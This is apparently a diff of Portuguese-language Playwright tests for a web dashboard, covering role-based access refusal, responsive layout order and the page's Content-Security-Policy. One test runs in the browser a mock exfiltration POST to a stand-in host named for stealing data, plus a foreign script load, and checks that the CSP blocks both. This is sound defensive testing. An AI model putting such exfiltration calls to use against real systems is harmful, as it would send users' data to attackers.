@@ -96,6 +96,10 @@ test('Diretor (equipe ou cliente): a tela nem chama o servidor', { timeout: 6000
       await pagina.waitForTimeout(1500);
       assert.equal(await pagina.locator('#labz-conteudo').isHidden(), true, role);
       assert.match(await pagina.textContent('#labz-sem-permissao'), /exclusiva do Super Admin/);
+      assert.equal(await pagina.locator('#labz-sem-permissao').isVisible(), true, `${role}: a recusa aparece`);
+      assert.match(await pagina.textContent('#lz-recusa-titulo'), /Área exclusiva do Super Admin/);
+      assert.equal(await pagina.getAttribute('#labz-sem-permissao a', 'href'), 'index.html');
+      assert.deepEqual(await pagina.evaluate(() => window.__cspViolacoes), [], `${role}: nada bloqueado pela CSP`);
     } finally { await contexto.close(); }
   }
   assert.equal(s.pedidos.length, 0, 'nenhum pedido chegou à API');
@@ -183,6 +187,11 @@ test('responsividade: 1280, 768, 375 e 320 px sem rolar para o lado, com os 8 ag
         assert.ok(r.sw <= r.w + 1, `${width}px: rola para o lado (${r.sw} > ${r.w})`);
         assert.equal(r.cards.length, 8);
         assert.ok(r.cards.every((c) => c.l >= -1 && c.r <= r.w + 1 && c.h > 20), `${width}px: cartão fora da tela`);
+        // I1: o que pede decisão e a nova tarefa vêm antes da equipe e do histórico; no computador, lado a lado
+        const topo = await pagina.evaluate(() => Object.fromEntries([['pend', '.lz-pendencias-painel'], ['tarefa', '.lz-tarefa'], ['equipe', '#lz-org'], ['hist', '.lz-historico']].map(([k, sel]) => [k, Math.round(document.querySelector(sel).getBoundingClientRect().top)])));
+        assert.ok(topo.pend <= topo.tarefa && topo.tarefa < topo.equipe && topo.equipe < topo.hist, `${width}px: ordem ${JSON.stringify(topo)}`);
+        if (width >= 1280) assert.equal(topo.pend, topo.tarefa, 'computador: decisões e nova tarefa na mesma linha');
+        else if (width <= 375) assert.ok(topo.pend < topo.tarefa, 'celular: decisões primeiro, depois a nova tarefa');
       } finally { await contexto.close(); }
     }
   } finally { await s.fechar(); }
@@ -203,4 +212,51 @@ test('modo de demonstração local continua funcionando (servidor-local.js)', { 
     await esperarTexto(pagina, '#lz-estado', /Concluída/, 40000);
     assert.deepEqual(erros, []);
   } finally { await contexto.close(); await new Promise((ok) => d.servidor.close(ok)); }
+});
+
+// ---------- I1: política de segurança da página (CSP) ----------
+const fs = require('node:fs');
+const path = require('node:path');
+const { SUPABASE_PRODUCAO } = require('./servidor-teste');
+
+function cspDaPagina() {
+  const html = fs.readFileSync(path.join(__dirname, '..', '..', 'demo', 'ui', 'labz-ai.html'), 'utf8');
+  const m = /<meta http-equiv="Content-Security-Policy" content="([^"]+)">/.exec(html);
+  assert.ok(m, 'a página tem a meta CSP');
+  assert.ok(html.indexOf(m[0]) < html.indexOf('<script'), 'a CSP vem antes de qualquer script');
+  return Object.fromEntries(m[1].split(';').map((x) => x.trim().split(/\s+/)).filter((x) => x[0]).map(([k, ...v]) => [k, v]));
+}
+
+test('CSP da página: tudo fechado por padrão; só o login (Firebase), as fontes e o Supabase da LABZ AI', () => {
+  const c = cspDaPagina();
+  assert.deepEqual(c['default-src'], ["'none'"]);
+  for (const d of ['object-src', 'base-uri', 'form-action']) assert.deepEqual(c[d], ["'none'"], d);
+  assert.deepEqual(c['script-src'], ["'self'", 'https://www.gstatic.com', "'unsafe-inline'"], 'scripts só do site e do SDK do Firebase (sem eval)');
+  assert.deepEqual(c['connect-src'], ["'self'", 'https://firestore.googleapis.com', 'https://identitytoolkit.googleapis.com', 'https://securetoken.googleapis.com', 'https://firebaseinstallations.googleapis.com', 'https://www.googleapis.com', SUPABASE_PRODUCAO]);
+  assert.deepEqual(c['img-src'], ["'self'", 'data:', 'blob:']);
+  assert.deepEqual(c['frame-src'], ['https://labz-18246.firebaseapp.com']);
+  const tudo = Object.values(c).flat();
+  assert.ok(!tudo.some((v) => v === '*' || /^\*|https:$|http:$/.test(v)), 'nenhum curinga');
+  assert.ok(!tudo.includes("'unsafe-eval'"));
+  assert.ok(!tudo.some((v) => /^http:/.test(v)), 'nada sem https');
+});
+
+test('CSP no navegador: a tela inteira funciona sem nenhum bloqueio, e falar com um endereço estranho é bloqueado', { timeout: 120000 }, async () => {
+  const s = await criarServidoresTeste();
+  const { pagina, erros, contexto } = await abrirLabz(s, { teste: SA });
+  try {
+    await pagina.waitForSelector('.lz-card[data-agente]');
+    await pagina.click('#lz-exemplos button:has-text("Só um roteiro")');
+    await pagina.click('#lz-iniciar');
+    await esperarTexto(pagina, '#lz-estado', /Concluída/, 90000);
+    assert.deepEqual(await pagina.evaluate(() => window.__cspViolacoes), [], 'nada da tela foi bloqueado');
+    const r = await pagina.evaluate(async () => { try { await fetch('https://coletor-de-dados.example/roubar', { method: 'POST', body: 'x' }); return 'saiu'; } catch (e) { return 'bloqueado'; } });
+    assert.equal(r, 'bloqueado');
+    const v = await pagina.evaluate(() => window.__cspViolacoes);
+    assert.ok(v.some((x) => /^connect-src https:\/\/coletor-de-dados\.example/.test(x)), `a CSP bloqueou: ${v.join(' | ')}`);
+    const sc = await pagina.evaluate(() => new Promise((ok) => { const e = document.createElement('script'); e.src = 'https://cdn-estranho.example/x.js'; e.onerror = () => ok('bloqueado'); e.onload = () => ok('carregou'); document.head.append(e); }));
+    assert.equal(sc, 'bloqueado');
+    assert.ok((await pagina.evaluate(() => window.__cspViolacoes)).some((x) => /^script-src(-elem)? https:\/\/cdn-estranho\.example/.test(x)), 'script de fora bloqueado pela CSP');
+    assert.deepEqual(erros, []);
+  } finally { await contexto.close(); await s.fechar(); }
 });
